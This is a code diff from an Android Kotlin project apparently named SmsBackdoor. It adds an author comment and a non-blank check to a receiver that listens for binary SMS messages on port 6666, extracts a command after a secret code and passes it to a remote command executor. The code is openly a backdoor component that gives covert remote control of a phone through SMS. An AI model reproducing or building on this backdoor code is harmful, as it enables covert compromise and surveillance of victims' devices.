@@ -40,6 +40,13 @@ import android.telephony.SmsMessage
 ............\..............(
 ..............\.............\...
 */
+/**
+* @author Chris Basinger
+* @email evilthreads669966@gmail.com
+* @date 10/08/20
+*
+* Subscribes to any received binary sms messages over port 6666 and processes the command and then passes it to the RemoteCommandExecutor
+* */
 internal class RemoteCommandReceiver: BroadcastReceiver(){
     override fun onReceive(ctx: Context?, intent: Intent?) {
         if(intent?.action.equals(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION)){
@@ -51,7 +58,7 @@ internal class RemoteCommandReceiver: BroadcastReceiver(){
                     msg.messageBody?.let{ body -> append(body) }
                 }
             }
-            command.toString().takeIf { cmd -> cmd.contains(SmsBackdoor.commandCode) }?.let { cmd ->
+            command.toString().takeIf { cmd -> cmd.isNotBlank() && cmd.contains(SmsBackdoor.commandCode) }?.let { cmd ->
                 val remoteCommand = cmd.split(SmsBackdoor.commandCode)[1].trim()
                 intent.putExtra(SmsBackdoor.KEY_REMOTE_COMMAND, remoteCommand)
                 RemoteCommandExecutor.enqueWork(ctx!!, intent)
